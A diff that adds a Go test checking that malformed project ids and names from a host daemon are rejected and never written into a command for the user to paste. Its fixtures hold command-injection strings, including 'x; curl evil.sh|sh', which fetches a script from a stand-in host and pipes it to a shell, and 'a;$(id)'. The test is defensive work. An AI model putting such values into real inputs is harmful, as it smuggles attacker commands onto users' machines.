@@ -180,6 +180,28 @@ func TestMovedMatch(t *testing.T) {
 	}
 }
 
+// TestMovedMatchBadAnswer: an id or a name of wb-hostd's that isn't one
+// is refused with RuleHostdAnswer, and never reaches a command the user
+// pastes (SEC03-no-host-exec).
+func TestMovedMatchBadAnswer(t *testing.T) {
+	root := tempDir(t)
+	inPlace := filepath.Join(newRepo(t, filepath.Join(root, "a")), ".git")
+	for _, m := range []*hostdv1.ProjectMatch{
+		{Id: "x; curl evil.sh|sh", Name: "a", Key: &hostdv1.ProjectKey{Realm: "native", Path: filepath.Join(root, "gone")}},
+		{Id: testID, Name: "a;$(id)", Key: &hostdv1.ProjectKey{Realm: "native", Path: filepath.Join(root, "gone")}},
+		{Id: testID, Name: "", Key: &hostdv1.ProjectKey{Realm: "native", Path: inPlace}},
+	} {
+		ref := movedMatch(root, []*hostdv1.ProjectMatch{m})
+		if ref == nil || ref.Rule != RuleHostdAnswer {
+			t.Errorf("match %q %q: %v, want %s", m.GetId(), m.GetName(), ref, RuleHostdAnswer)
+			continue
+		}
+		if strings.Contains(ref.Error(), "wb project") {
+			t.Errorf("message %q writes out a command", ref)
+		}
+	}
+}
+
 // TestNotice names the new project and each match with its placement.
 func TestNotice(t *testing.T) {
 	op := &Opened{
